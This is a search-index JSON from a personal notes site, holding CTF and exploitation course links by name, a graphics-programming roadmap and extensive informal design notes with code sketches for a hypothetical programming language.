{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Hello, World!","text":""},{"location":"blog/","title":"Blog","text":""},{"location":"ctf/","title":"CTF","text":""},{"location":"ctf/#ctf_1","title":"Ctf","text":"<p>wargame sites</p> <p>hacker links and ctf writeups</p> <p>beginner ctf courses</p> <p>ctf resources</p>"},{"location":"ctf/#pwnre","title":"Pwn\\&amp;Re","text":"<p>Binary exploitation notes (stack, heap, kernel)</p> <p>Nightmare (great binexp/re course. learning by doing)</p> <p>Nightmare improved by hoppersroppers (nightmare with tutorials and extra links)</p> <p>Pwn.college (binexp course with tons of challenges)</p> <p>Exploit Education (vulnerability analysis, exploit development, software debugging, binary analysis, and general cyber security issues)</p> <p>OSED-Pre (some pwn resources)</p>"},{"location":"games/","title":"Game hacking","text":"<p>https://www.unknowncheats.me/forum/anti-cheat-bypass/271733-driver-aka-kernel-mode.html</p>"},{"location":"graphics/","title":"Graphics","text":""},{"location":"graphics/#roadmap","title":"roadmap","text":"<p>math (for reference):</p> <ul> <li>3D Math Primer for Graphics and Game Development</li> </ul> <p>learning graphics:</p> <ul> <li>scratchapixel</li> <li>graphics from scratch</li> <li>raytracing in one weekend</li> <li>real-time rendering</li> <li>tinyrenderer</li> <li>rasterization in one weekend</li> <li>A trip through the Graphics Pipeline</li> <li>physically based rendering</li> </ul> <p>learning api:</p> <ul> <li>vulkan-tutorial</li> <li>introduction to 3D Game Programming with DirectX 12</li> <li>vkguide</li> </ul> <p>game engine:</p> <ul> <li>Foundations of Game Engine Development</li> <li>Game Engine Architecure</li> </ul>"},{"location":"graphics/#other-resources","title":"other resources","text":"<ul> <li>GPU Gems</li> <li> <p>graphics-weekly</p> </li> <li> <p>resources</p> </li> <li>gp-resources</li> <li>Finding Your Home in Game Graphics Programming</li> <li>performance-aware</li> </ul>"},{"location":"graphics/#projects","title":"projects","text":"<ul> <li>Make a sphere mesh using spherical coordinates, and render it.</li> <li>Implement shader for simple diffuse and specular shading.</li> <li>Directional Lights, point lights, and spot lights</li> <li>Heightmap Rendering</li> <li>Write a simple parser for a simple mesh format such as Wavefront .obj, import   it into your program and render it. In particular, try and import and render   meshes with textures.</li> <li> <p>Implement a simple minecraft renderer. It is surprisingly simple to render   minecraft-like worlds, and it is also very learningful.</p> </li> <li> <p>Render reflections using cubemaps</p> </li> <li>Shadow rendering using shadow maps.</li> <li> <p>Implement view frustum culling. This is a simple, yet very practical   optimization technique.</p> </li> <li> <p>Implement rendering of particle systems</p> </li> <li>Learn how to implement Gamma Correction.</li> <li>Implement normal mapping</li> <li>Learn how to render lots of meshes efficiently with instanced rendering</li> <li>Animate meshes with mesh skinning.</li> </ul>"},{"location":"graphics/#advanced","title":"advanced","text":"<ul> <li>Various post-processing effects. Like Bloom(using Gaussian blur), ambient   occlusion with SSAO, anti-aliasing with FXAA.</li> <li>Implement deferred shading, a technique useful for rendering many light sources.</li> </ul>"},{"location":"inbox/","title":"Inbox","text":"<p>my unfiltered and unorganized thoughts</p> <p>there is no theme, no structure, no order</p>"},{"location":"inbox/compiler/","title":"compiler","text":""},{"location":"inbox/compiler/#ltr-syntax","title":"ltr syntax","text":"<pre><code>-- haskell is generally read right to left\nprint . foldr (+) 0 . filter odd $ [1..10]\n-- first filter odd, then sum, then print\n-- this is because this is how function application works in general\nprint(fold(...))\n\n-- would it be better to reverse this?\n[1..10] |&gt; filter odd |&gt; foldr (+) 0 |&gt; print\n-- imo, this is more readable at first glance\n-- apparently, it's common in f#\n-- it seems to be called forward/backward composition\n</code></pre>"},{"location":"inbox/compiler/#live-codingdebugging","title":"live coding/debugging","text":"<ol> <li>repl</li> <li>changing code while running (hot reloading)</li> </ol>"},{"location":"inbox/compiler/#naming","title":"naming","text":"<p>capitalized types</p>"},{"location":"inbox/compiler/#conventions","title":"conventions","text":"<p>haskell naming conventions</p> <ul> <li>underscore postfix for functions that loop and don't return (haskell <code>until_</code>)</li> <li>prefix question mark or underscore for typed holes (idris, haskell)</li> </ul> <p>it prevents double-naming (i.e. some may use isSame, some same (like contains   instead of doesContain). same?, contains? read better than any other)</p> <p>i really like this, but may clash with infix operators if ? can be used. i.e.   <code>a?=b</code> may be interpreted as <code>a ?= b</code> or <code>a? = b</code>   option is just not allow ? in infix operators/start of them</p> <p>maybe prefer result (i.e. <code>find : ... -&gt; Result Index</code>) instead of predicates   and use ? to convert result to bool (i.e. <code>cointains = find?</code>)</p> <ul> <li>postfix question mark for predicates (lisp)</li> </ul>"},{"location":"inbox/compiler/#flow-typing","title":"flow typing","text":"<pre><code>(/) : Int -&gt; Int -&gt; Result Int of\n  _, 0 -&gt; error DivByZero\n  x, y -&gt; builtin_div x y\n\n-- usage\n\nx / y -- : Result Int\nx / 10 -- : Int. compiler detects first branch is unreachable\n-- if you know something compiler doesn't, you can use assert or assume. use\n-- sparingly\nassume y != 0 in x / y -- : Int\n\ndigitToInt : Char -&gt; Result Int of\n  x | isDigit x -&gt; (ord x) - '0'\n    | _ -&gt; error NotDigit\n\nintOrZero : Char -&gt; Int of\n  x | isDigit x -&gt; digitToInt x -- : Int. x is constant and isDigit is pure\n    | _ -&gt; 0\n\n-- note that these are essentially just refinement types\n-- we would also like a way to do a check for the output\n\ntoChar : Int -&gt; Result Char\n  ensures isDigit result\nof\n  | x | x &gt;= 0 &amp;&amp; x &lt; 10 -&gt; chr $ x + ord '0'\n  | _ -&gt; error NotDigit\n\ndigitToInt $ toChar 5 -- : Int\n-- 5 &gt;= 0 &amp;&amp; 5 &lt; 10, meaning toChar 5 : Char and because toChar ensures isDigit,\n-- digitToInt $ toChar : Int. the compiler also needs to check that the result\n-- of toChar is always a digit\n</code></pre>"},{"location":"inbox/compiler/#no-match-expr","title":"no match expr","text":"<pre><code>-- use equation style instead\n\n-- problem. duplicated params\nf : Env -&gt; Params -&gt; SumType -&gt; Result of\n  env, params, A =&gt; ...\n  env, params, B =&gt; ...\n  env, params, C =&gt; ...\n  env, params, D =&gt; ...\n\n-- with match, this would be much better\nf : Env -&gt; Params -&gt; SumType -&gt; Result of\n  env, params, sumty = case sumty of\n    A =&gt; ...\n    B =&gt; ...\n    C =&gt; ...\n    D =&gt; ...\n\n-- alternative, without match, allow of within of\nf : Env -&gt; Params -&gt; SumType -&gt; Result of\n  env, params of\n    A =&gt; ...\n    B =&gt; ...\n    C =&gt; ...\n    D =&gt; ...\n</code></pre> <p><pre><code>## unused fields\n</code></pre> struct vec { data: [i32], len: i32 }</p> <p>// different syntax type dataonly = @skip(len) vec</p> <p>b : dataonly = ...</p> <p>// you can only use functions that don't use the len field <pre><code>## explicit currying\n</code></pre> a : (a: i32, b: i32) -&gt; i32   = a + b</p> <p>a5 : (a: i32) -&gt; i32 = a(5, $1)</p> <p>fn add3(a, b, c) -&gt; i32 = a + b + c</p> <p>fn a5(a) = add3(3, 2, a) a5 = add3(3, 2, $1) a25 = add3(5, $1, $2) a25 = add3(5, $..)</p> <p>// alternative. use named arguments a5 = add3 ~a=3 ~b=2</p> <p>// alternative. use ! after function name // explicitly show that it's currying a5 = add! 3</p> <p>// idea. explicitly need to enable currying fn add(a, b) ... add5 = add 5 // not allowed</p> <p>fn add(~a, b, c) add5 = add ~a=5 // allowed (int-&gt;int-&gt;int) add53 = add ~a=5 ~b=3 // not allowed. b doesn't allow currying <pre><code>## unnamed arguments\n</code></pre> // only one letter argument names don't need to be named fn add(a, b) = a + b add 5 3 // ok</p> <p>fn map(fn, data) = ... map(fn=add 5, data=...) map(add 5, ...) // not allowed. fn is not single letter <pre><code>## interface change should always result in a compile error\n\nvariable type/function signature are considered their respective interface\n\n## infix functions\n\n```hs\n-- 2-parameter functions in haskell can be infix\nmod 5 2 == 5 `mod` 2\n\n-- maybe better to explicitly declare a function infix\n-- e.g. a function starting with `\nmod :: Int -&gt; Int -&gt; Int -- not infix\n5 mod 2 -- error\n`mod :: Int -&gt; Int -&gt; Int -- infix\n`mod 5 2 -- error\n5 `mod 2 -- ok\n-- curry\n(`mod 5) 2 == 2 `mod 5\n(5 `mod) 2 == 5 `mod 2\n</code></pre></p> <pre><code>## named parameters\n\n```ml\n(* named parameters considered bad and are usually a crutch for bad api design\n   contrived example, but illustrates the point *)\nadd : float -&gt; float -&gt; float -&gt; float -&gt; float -&gt; float -&gt; float -&gt; float -&gt; float\n\n(* preferred *)\nalias Point = { x: float, y: float, z: float }\nadd : Point -&gt; Point -&gt; Point\n\n(* possible keyword parameters ala ocaml *)\nadd : ~name: String = \"unnamed\" -&gt; Int -&gt; Item\n   of x = ...\n(* usage *)\nadd ~name=\"foo\" 5\n</code></pre>"},{"location":"inbox/compiler/#idk-anymore","title":"idk anymore","text":"<pre><code>module Vector\n  Item : Type\n  len : Int\n  data : [Item]\n\nlet of_list : [Item] -&gt; Vector\n\nlen : Self -&gt; Int\n    | self = self.len\n\nconcat : Self -&gt; Self -&gt; Self\n       | self, other = { len = self.len + other.len }\n</code></pre>"},{"location":"inbox/compiler/#module-parameters","title":"module parameters","text":"<pre><code>(* file: random.x *)\nmodule Random(seed: Int)\n\n(* seed can be used as if it's a val *)\nlet state = seed ref\n</code></pre> <pre><code>(* main gets the env argument *)\nmodule Main(env : Env)\n\nlet () =\n  Stream(env.out).printf \"Hello, world\\n\"\n</code></pre>"},{"location":"inbox/compiler/#type-annotations-instead-of-gemerics","title":"type annotations instead of gemerics","text":"<p>type annotations are basically type functions</p> <pre><code>type fn option(t) = (\n  valid : bool\n  data : t\n)\n\nlet y : option int\n</code></pre>"},{"location":"inbox/compiler/#haskell-style-type-syntax","title":"haskell-style type syntax","text":"<pre><code>:: Int, Int -&gt; Int\nfn add(a, b) = a + b\n\n\n(* maybe?? *)\nlet add : Int -&gt; Int -&gt; Int =\n          a,     b,  = a + b\n\nlet plus : Nat -&gt; Nat -&gt; Nat of\n         | Z  , n -&gt; n\n         | S m, n -&gt; S (plus m n)\n</code></pre>"},{"location":"inbox/compiler/#names-from-types","title":"names from types","text":"<pre><code>fn insert(Ord, BTree)\n\n(* equivalent to *)\nfn insert(ord: Ord, bTree: BTree)\n\n(* not allowed when ambiguous *)\nfn add(a: Int, b: Int)\n</code></pre>"},{"location":"inbox/compiler/#optional-struct-features","title":"optional struct features","text":"<pre><code>struct list&lt;bool double_ended?, bool sized?&gt;(\n  next: Self,\n  @if double_ended?\n  prev: Self,\n  @if sized?\n  length: i32,\n)\n\nfn len(list: list&lt;sized? = true&gt;) = list.length\n\n// in rust, it would be a wrapper (ex. peekable)\nstruct sized(list: list, length: i32)\n</code></pre>"},{"location":"inbox/compiler/#pipe-scope","title":"pipe scope","text":"<pre><code>// piping some type brings into scope the module in which it is defined\n\nmodule A {\n  type B = i32;\n  let add5 x = x + 5\n}\n\nA.B |&gt; add5\n// equivalent to\nA.B |&gt; A.add5\n</code></pre>"},{"location":"inbox/compiler/#statement-expr-consumer","title":"statement = expr consumer","text":"<pre><code>fn a() = expr\n\nfn b()\n  ; expr\n  = expr\n</code></pre>"},{"location":"inbox/compiler/#functions-as-pattern-matchers","title":"functions as pattern matchers","text":"<pre><code>// first argument must be a list of two elements\nfn something([a, b], c: i32) = a + b + c\n\n// overloading\nfn a(arg: f32) = ...\nfn a(arg1, arg2) = ...\nfn a(arg: i32) = ...\n\na something\n// is equivalent to\nmatch something\n| (arg: f32) =&gt; // call a(arg: f32)\n| (arg1, arg2) =&gt; // call a(arg1, arg2)\n| (arg: i32) =&gt; // call a(arg: i32)\n</code></pre>"},{"location":"inbox/compiler/#macro-system","title":"macro system","text":"<pre><code>macro if {$(condition: expr) =&gt; $(then: expr) else $(else: expr)} =&gt;\n  match ${condition} | true =&gt; ${then} | false =&gt; ${else}\n</code></pre> <p>another idea is to have alternative lisp frontend and to call lisp functions from the language</p>"},{"location":"inbox/compiler/#no-bracket-syntax","title":"no-bracket syntax","text":"<pre><code>fn a(a: i32) -&gt; i32 = a + 5;;\n\nfn a(a: i32) = print a;;;\n\nstruct Point(x: i32, y: i32)\n\nchoice A =\n  | A(i32)\n  | B(f32)\n\n// =&gt; always denotes a block start. ;; block end\n=&gt;\n  let x = 5;\n  x + 5\n;;\n\n// let with block\nlet x : i32 =&gt;\n  let y = 5;\n  y\n;;\n\nfn a(a: i32) -&gt; i32 =&gt; a + 5;;\n\nfor i in 0..10 =&gt; print i;;\n\nlet lbtype: () -&gt; void;;\n\n\nlet lambda = (x: i32) -&gt; f64 =&gt; x + 5;;\nlet lambda = (x: i32) =&gt; x + 5;;\n\n=&gt; print 5;;\n\n// block is either a signgle expression or list of statements taht require\n// return\nfn a() =&gt; 5 + 3;;\nfn a() =&gt;\n  let x = 5 + 3;\n  return x\n;;\n\nif a &lt; 5 =&gt; print a;;\n\nif a &lt; 5 =&gt; a; else 5; let x = 5; x;\n\nfn a =&gt; 5\n\n// same as\nfn a() -&gt; i32 =&gt; 5\n\nif a &lt; 5 =&gt; a else 5\n\nassert a &lt; 5\n\n// expression based. ';' joins expressions\n\n// significant indentation\n\n=&gt;\n  if x &lt; 5 =&gt;\n    print x;\n    x = 5;\n  x = 3; // not part of if block\n    5 // misleading indentation error\n\n=&gt;\n  match y =&gt;\n    | ... =&gt; match x\n      | 5 =&gt; print x\n      | 3 =&gt; print 3\n    | _ =&gt; print y\n\n// lambda\n()=&gt; 5\n\n// problem\n\nprint(x) =&gt; 5 // print(x)(=&gt; 5)\nprint (x)=&gt; 5 // print((x) =&gt; 5)\nprint (x)=&gt; 5 () // print((x) =&gt; 5)() ?\n</code></pre>"},{"location":"inbox/compiler/#enum","title":"enum","text":"<pre><code>// enum is a type sum\ntype Enum = i32 | f32;\n// Enum is either i32 or f32\n\n// there are on-fly types\ntype Enum =\n  | A(i32)\n  | B(f32)\n\n// equivalent to\ntype A = i32;\ntype B = f32;\ntype Enum = | A | B;\n\n// there are also implicit void types\ntype Enum = A | B | C\n// equivalent to\ntype Enum = A() | B() | C()\n</code></pre>"},{"location":"inbox/compiler/#name-first-syntax","title":"name-first syntax","text":"<pre><code>a : i32 = 5;\nb := 5;\n\nlmb : (i32) -&gt; i32 = { it + 5 }\nlmb := { it + 5 }\n\n// problem\nfn a() { ... } // implies void return\na : () = { ...; 5 } // implies deduced return type\n</code></pre>"},{"location":"inbox/compiler/#module-arguments","title":"module arguments","text":"<pre><code>module Map {\n  struct T { }\n  fn get(map: T, key: String) -&gt; Val { map.get(key); }\n}\n</code></pre>"},{"location":"inbox/compiler/#destructibles","title":"destructibles","text":"<pre><code>struct unique_ptr(item: *i32);\n\nfn drop(self: unique_ptr) { free self.item; }\n\n// unique_ptr is destructible. you cannot assign it\nlet a = unique_ptr(malloc(int)); // not allowed\n\n// you can only create it with 'with'\nwith a = unique_ptr(malloc(int));\n\n// with calls drop at the end of the block\n</code></pre>"},{"location":"inbox/compiler/#local-returns","title":"local returns","text":"<pre><code>// syntax\n// exit [label] [value] ['if' condition]\n// if label is not provided, it exits the inner-most block\nfn a() {\n  exit fn 10 if true;\n  exit a\n\n  a := {\n    exit 5\n  } // =&gt; 5\n\n  loop {\n    exit a if a &gt; 10;\n    a += 2;\n  } // =&gt; 11\n}\n</code></pre>"},{"location":"inbox/compiler/#first-class-fsm-finite-state-machine","title":"first-class fsm (finite state machine)","text":"<p>see: reddit <pre><code>while True:\n  print \"always\"\nwith state_1:\n  print \"state 1\"\n  continue state_2\nwith state_2:\n  print \"state 2\"\n  continue state_1\n\n// outputs\n// always, state 1, always, state 2, always, state 1, ...\n</code></pre></p>"},{"location":"inbox/compiler/#auto-generated-function-types","title":"auto-generated function types","text":"<pre><code>// you write\nfn add(a, b) = a + b;\n\n// compiler adds types with capitalized names upon succesful compilation\n:: (A: Addition, A) -&gt; A\nfn add(a, b) = a + b;\n</code></pre>"},{"location":"inbox/compiler/#literal-variants","title":"literal variants","text":"<pre><code>fn a() -&gt; | Yes | No {\n  if true { Yes } else { No }\n}\n\nassert(a() == a::Yes)\n</code></pre>"},{"location":"inbox/compiler/#extern","title":"extern","text":"<pre><code>// body replaced with #foreign\nfn atoi(s: str) -&gt; i32 #foreign;\n</code></pre>"},{"location":"inbox/compiler/#assignment-sugar","title":"assignment sugar","text":"<pre><code>a = b\n// this is just sugar for\na.set(b)\n\na .= add(b) // a = a.add(b)\n</code></pre>"},{"location":"inbox/compiler/#automatic-lift-for-collections","title":"automatic lift for collections","text":"<pre><code>fn add5(a: i32) -&gt; i32 = a + 5;;\n\nadd5(10); // -&gt; 15\nadd5([10, 20, 30]) // -&gt; [15, 25, 35]\n</code></pre>"},{"location":"inbox/compiler/#dependent-types-and-first-class-modules","title":"dependent types and first class modules","text":"<pre><code>use sys.Os().Out;\n\nfn Os() -&gt; module {\n  if Linux { return sys.linux; }\n  err UnsupportedOs\n}\n</code></pre>"},{"location":"inbox/compiler/#struct-modules-primary-structures","title":"struct modules / primary structures","text":"<pre><code>module Program {\n\n// because Scanner has data, it's a struct module. that means, there is an\n// implicit struct Scanner(data: [i32]);\nmodule Scanner {\n\ntype Enum = | A | B | C;\n\nlet data: [i32];\n\n// constructor\nfn(data: [i32]) =&gt;\n  // we need to initialize all fields\n  data = data;\n\nfn get() -&gt; i32 =&gt; data.pop()\n\n}\n\nScanner([1, 2, 3]).pop() // -&gt; 3\n\n}\n</code></pre>"},{"location":"inbox/compiler/#non-optional-subtyping","title":"non-optional subtyping","text":"<pre><code>/// note b is option\nstruct A(a: i32, b: i32?)\n\ntype A2(a: i32, b: i32) : A;\n</code></pre>"},{"location":"inbox/compiler/#ufcs","title":"ufcs","text":"<pre><code>fn a(this: i32, that: i32) -&gt; i32 = this + that;;\n\na(5, 6) == 5.a(6)\n\n\nfn add(this: i32, that: i32) -&gt; i32 { this + that }\n</code></pre>"},{"location":"inbox/compiler/#struct","title":"struct","text":"<pre><code>struct&lt;A: Integral&gt; Int: A(\n\n)\n\nfn Int::a(i)\n\n// primary constructor\ntype Int(a: i32) = struct(\n  x: i32 = a,\n  y: i32 = 5,\n)\n\n// if primary constructor is not provided, imlicit one will be created\n// implicit constructor requires all named fields.\n\n// you can also overload a constructor\n// note. no return type. constructor always returns self\n// you assign fields in self\nfn Int::Int(self: Int) {\n  self.x = 5;\n  self.y = 5;\n}\n</code></pre>"},{"location":"inbox/compiler/#module-classes","title":"module classes","text":"<pre><code>module Vector;\n\ndata: *i32;\n\nconstructor() {\n  data = malloc(5 * sizeof(i32));\n}\n</code></pre> <pre><code>module vector;\n\nfn dump(stream: Stream = std::out) {\n  stream.write(data);\n  loop items {\n    stream.write(it);\n  }\n}\n\nfn dumpitem(stream: Stream = std::out) {\n  stream.write(data);\n}\n\nmodule dump {\n\n  fn dump() {\n    stream.write(data);\n  }\n}\n\n\n\n}\n</code></pre>"},{"location":"inbox/compiler/#constructors","title":"constructors","text":"<pre><code>struct Vec(x: i32, y: i32, z: i32)\n\n// constructors are separated from other functions by capitalized name\nfn Vec.Zero() { Vec(0, 0, 0) }\n\n// function with same name as struct is a constructor. it implicitly returns the\n// struct\nfn Vec() { Vec(0, 0, 0) }\n\n\n// option 2.\nfn Vec.Vec() { }\n\nVec() // sugar for Vec.Vec()\n</code></pre>"},{"location":"inbox/compiler/#signatures","title":"signatures","text":"<pre><code>sig Map {\n  type Key;\n  type Value;\n\n  fn get(key: Key) -&gt; Value;\n}\n\nsig IntMap : Map {\n  type Key = i32;\n}\n\nstruct IntHashMap = HashMap : IntMap;\n\n// note that : Map is completely optional. it just tells the compiler to emit an\n// error if it's not a subtype of Map. it signs Map even without it\nstruct&lt;\n  type Key\n  type Value\n  type UnderlyingContainer : Stack&lt;Key&gt; = Vec&lt;Key&gt;\n&gt; HashMap : Map(type Value = V) {\n  let value: UnderlyingContainer;\n}\n\nstruct HashMap&lt;Key, Value&gt;\n\nfn HashMap::get(key: Key) -&gt; Value {\n  ...\n}\n\n// this just checks that HashMap is a subtype of Map\n// equivalent to HashMap : Map in definition\nstruct _ = HashMap : Map;\n\nlet a = HashMap&lt;i32, i32&gt;();\nlet b = IntMap&lt;i32&gt;();\n\nstruct Something()\n\nstruct Something : Map{type Key = i32; type Value = i32}\n\nfn Something::get(i32) -&gt; i32 {}\n</code></pre>"},{"location":"inbox/compiler/#program-stages","title":"program stages","text":"<pre><code>@stage(1)\nstatic x; // x can only be modified in stage 1 or earlier\n\n// a can only be called by functions in stage 1 or earlier\n@stage(1)\nfn a() {\n  x = 10;\n}\n\n// b can not call a, but a can call b\n@stage(2)\nfn b() {\n\n}\n\n// concurrency cannot be used in any stage\n\nfn main() {\n  // by default, main doesn't have a stage\n  // the first statement needs to be @stage if you want to use stages\n\n  // transition. cannot have code before this\n  @stage 1\n}\n</code></pre>"},{"location":"inbox/compiler/#lambdas","title":"lambdas","text":"<pre><code>// normal syntax\nlet a = (x: i32) -&gt; i32 { x + 5 }\n\n// trailing lambda syntax\na.map { it + 5 }\n\n// lambda blocks\nlet a = { (x: i32) -&gt; i32 =&gt; x + 5 }\nlet a = { x =&gt; x + 5 }\n\n// lambda blocks differ from normal blocks by =&gt;\n{ =&gt; 5 } // lambda\n{ 5 } // block\n</code></pre>"},{"location":"inbox/compiler/#loops","title":"loops","text":"<pre><code>// while loop\nwhile a &lt; 5 { }\n\n// iteration loops with lambdas\nloop vec(5, 3, 2, 1) {\n  print it\n}\n\n// inifinite loop\n// note that with loops, block is implicitly a lambda, so you can skip =&gt;\nloop { // =&gt; optional\n}\n</code></pre>"},{"location":"inbox/compiler/#enum-traits","title":"enum traits","text":"<pre><code>enum trait Color {\n  fn r() -&gt; u8;\n  fn g() -&gt; u8;\n  fn b() -&gt; u8;\n}\n\n// all variants of Color must be in same module\nstruct Red : Color();\nfn Red::r() -&gt; u8 { 255 }\nfn Red::g() -&gt; u8 { 0 }\nfn Red::b() -&gt; u8 { 0 }\n</code></pre>"},{"location":"inbox/compiler/#enum_1","title":"enum","text":"<pre><code>enum Color {\n  Red: i32,\n  Green: i32,\n}\n</code></pre>"},{"location":"inbox/compiler/#optionalextension-fields","title":"optional/extension fields","text":"<pre><code>struct Player(has_hitbox: bool) {\n  hitbox?: Hitbox = has_hitbox? Hitbox(),\n}\n// hitbox is an optional field. if has_hitbox is false, the field will not even\n// be allocated upon construction\n// this mimics llvm's TrailingObjects class\n// you cannot create Hitbox after construction\n</code></pre>"},{"location":"inbox/compiler/#monads","title":"monads","text":"<pre><code>fn addone(a: i32) -&gt; i32? { if a &lt; 5 { a + 1 } else { none } }\n\nlet x = addone(4)\n     =&gt; addone(it) // 5\n     =&gt; addone(it) // not run\n     =&gt; addone(it)\n\nassert(!x?)\n</code></pre>"},{"location":"inbox/compiler/#idea","title":"idea","text":"<p>a way to encapsulate states in a type and only expose the states that are valid at the time</p> <p>e.g. ast -&gt; typedast</p> <pre><code>struct VarDecl {\n  substruct Typed {\n    name: String,\n  }\n  type: Type*, // when initially creating ast, we may not know the type\n}\n\nfn analyze(Typed decl) -&gt; VarDecl {\n  // decl.type has uninitialized state\n\n  // function figures out the type\n  update decl {\n    type = ...\n  };\n  // note that updating decl does not resize/move the struct. Typed has the same\n  // size as VarDecl, but only exposes the fields that are valid in that\n  // substruct\n\n  return decl; // decl is now VarDecl and decl.type is valid\n}\n\n// this will also help creating new structs\nstuct A { XKnown { x: i32 }, y: i32 }\nlet a = XKnown { x: 5 }\nfn figureOutY(a: XKnown) -&gt; i32 { 10 }\nlet y = figureOutY(a)\nupdate a { y = y };\n</code></pre>"},{"location":"inbox/compiler/#errors","title":"errors","text":"<p>see duffy-error-model</p> <p>error return function annotation</p> <pre><code>error SomeError\nerror AnotherError \"\"\nerror MsgError(i32) \"\" // you can have data in error\n\n// function that returns an error\n// throwing a ParseError will throw AnotherError\n@throws(SomeError \"something happened\", // all errors reqire documentation\n        AnotherError &lt; ParseError, // any instance of ParseError will be thrown\n                                   // as AnotherError\n        DataError(i32) \"\" // you can attach data to errors. may be removed for\n                          // performance\n)\nfn root(x: i32) -&gt; f64 {\n  if x &gt; 0 { (f64 x).sqrt() } else {\n    err ParseError // this will throw AnotherError\n    // probably won't allow this. you can only directly throw SomeError but you\n    // can rethrow ParseError\n  }\n}\n\n// caller needs to handle the errors somehow\nroot(0) err // rethrow\nroot(0) catch e {\n  // e is an enum of possible errors\n  print(\"error: {e}\")\n  // trace e allows you to print the stack trace. this is only allowed in\n  // prototype mode as they are expensive to generate\n  trace e\n}\n// this will assume root doesn't error. in debug moe, this will abort the\n// program\nlet x = assert root(9)\n\n// everything that can error, does. like arithmetic, array access, ...\n// and you need to handle it\nlet x = assert a + b\n// there are unchecked versions of these operators\nlet x = a +! b // may overflow\n// there is also compiler flow analysis that will allow you to skip checking\nassert a &lt; 5\nlet x = a + 5 // no error. compiler knows it can't overflow\n// assert checks in release mode and panics if false.\n// for debug only checks, you use assume\nassume a &lt; 5 // checks in debug. in release, it's a no-op\n</code></pre>"},{"location":"inbox/compiler/#contract-idea","title":"contract idea","text":"<p>see duffy-error-model</p> <pre><code>@error SqrtError \"can't sqrt negative number\"\n@requires x &gt;= 0 else SqrtError\n@debug @requires x &lt; 1000 // maybe\n@ensures result &gt;= 0 // result is a special keyword in ensures clause\nfn sqrt(x: f64) -&gt; f64\n{\n  // x is guaranteed to be &gt;= 0\n  x.sqrt()\n}\n\n// if you can guarantee the contract, you can skip the error handling\nassert a == 4\nsqrt(a) // no error\nassert b == -1\nsqrt(b) // need to handle error\n</code></pre>"},{"location":"inbox/compiler/#traits-and-concepts","title":"traits and concepts","text":"<pre><code>trait Number : Add + Sub + Mul + Div {\n  fn abs(self) -&gt; Self;\n}\n\nconcept&lt;T&gt; Numeric {\n};\n\nfn Numeric::abs()\n</code></pre>"},{"location":"inbox/compiler/#generics","title":"generics","text":"<pre><code>struct Vec&lt;T&gt;()\n\nfn Vec::push(T t) {\n  // T is available\n}\n\nfn&lt;A&gt; Vec&lt;A&gt;::push(A a) {\n  // in case you need T from outer scope?\n}\n</code></pre>"},{"location":"inbox/compiler/#nominal-vs-structural-typing","title":"nominal vs structural typing","text":"<pre><code>trait Iterator {\n  fn next(self) -&gt; T;\n}\n\nstruct A();\n\nimpl Iterator for A {\n  ...\n}\n\nstruct B();\n\n// you can use Int as Iterator implicitly\n// but need to cast B to iterator explicitly\n\n// probably going to use nominal typing and structural subtyping of\n// traits/contracts. that is, you don't need to impl Trait for a type to use it.\n// it just needs to be in scope\n\n// if it walks like a duck and talks like a duck, then it's a duck\ncontract Duck {\n  fn talk();\n  fn walk();\n}\n\n// a duck can fly\nfn Duck::fly() { ... }\n\n// Pig walks and talks\nstruct Pig();\nfn Pig::talk() { print(\"oink\") }\nfn Pig::walk() { ... }\n\n// ergo, Pigs can fly\nPig().fly();\n</code></pre>"},{"location":"inbox/compiler/#dafault-initializations","title":"dafault initializations","text":"<p>nothing is default initialized. you need to explicitly initialize everything you use. there is however late initialization</p>"},{"location":"inbox/compiler/#prototype-mode","title":"prototype mode","text":"<p>you can enable prototype mode in the project file. this will allow you to use some features that are nice to have, but shouldn't be used in production code. e.g. stack traces. in this mode, the compiler will try to recover from syntax errors and continue compiling and just print a warning of what it assumed you meant. some compiler errors will also be warnings or disabled in this mode. e.g. unused variables, unreachable code, unhandled errors, etc.</p>"},{"location":"inbox/compiler/#unexpected-annotation","title":"unexpected annotation","text":"<pre><code>if a &lt; 5 {\n  doSomething\n} else {\n  // in debug mode, this will abort the program with an error message\n  // in release mode, the compiler will assume this is unreachable\n  @unexpected(\"a shouldn't be less than 5\")\n}\n</code></pre>"},{"location":"inbox/compiler/#idea-indent-based","title":"(idea) indent-based","text":"<p>indent-based blocks that end with two semicolons. statements end with one</p> <pre><code>fn add(a: i32, b: i32) = a + b;;\nfn add(a: i32, b: i32) =\n  let c = a + b;\n  c\n;;\n</code></pre>"},{"location":"inbox/compiler/#idea-function-syntax","title":"(idea) function syntax","text":"<pre><code>fn add a: i32 -&gt; b: i32 -&gt; i32 = a + b\n// equivalent with lambda notation\nlet add = fn a: i32 -&gt; b: i32 -&gt; i32 { a + b }\n// no parameters\nlet no_args = fn -&gt; () { () }\n// ==\nlet no_args = fn () -&gt; () { () }\n</code></pre>"},{"location":"inbox/compiler/#other-languages-interop","title":"other languages interop","text":"<p>you declare modules for other languages in the project file</p> <pre><code>// declerations from terrain.hpp are in terrain module\ninclude(cpp) \"terrain.hpp\" in terrain\n// declerations from stdio are in cppio module\ninclude(c) &lt;stdio.h&gt; in cio\n</code></pre> <p>then in your code, you can define and use them</p> <pre><code>module terrain // you need to be in the same module to define functions\n\n// assume terrain.h has following contents\n// int get_height(int x, int y);\n\n// we define the function here\nlet get_height = (x: i32, y: i32) -&gt; i32 {\n\n  // we can also call functions from other modules like this\n  cio::printf(\"hello world\\n\");\n\n  10 // return value\n}\n</code></pre>"},{"location":"inbox/compiler/#ideas","title":"ideas","text":"<p>invalid states, which stack let a = 5. / 0.; // inf. invalid state a += 5.; // valid statement. returns f64? with invalid state inf</p> <p>you can define invalid states on your own types impl Invalid for f64 {   Infinity { i == inf }   NaN { I == nan } }</p> <p>. | pipes output of a function to another function a | b but |. pipes output to a member function</p> <p>ability to split module interface (like header files). outside of module you can only access interface structures</p> <pre><code>interface module ::json\nfn parse() { ... }\n\nfn to_string();\n\nmodule // ::json\n\nfn to_string() { ... }\n</code></pre>"},{"location":"inbox/compiler/#variables","title":"variables","text":"<p>best-ml-way</p> <pre><code>// should mutability be part of type or variable (rust) or both (c++)?\nmut x = 5;\n// vs\nlet x: mut i32 = 5;\n\n// difference is allowing internal immutability\n\n// type mutability\nstruct Point (x: mut i32, y: i32);\nlet p: mut Point = Point(x: 1, y: 2);\np.x = 5; // allowed\np.y = 5; // not allowed\nlet r: Point = Point(x: 1, y: 2);\nr.x = 5; // not allowed\n\n// variable mutability doesn't allow 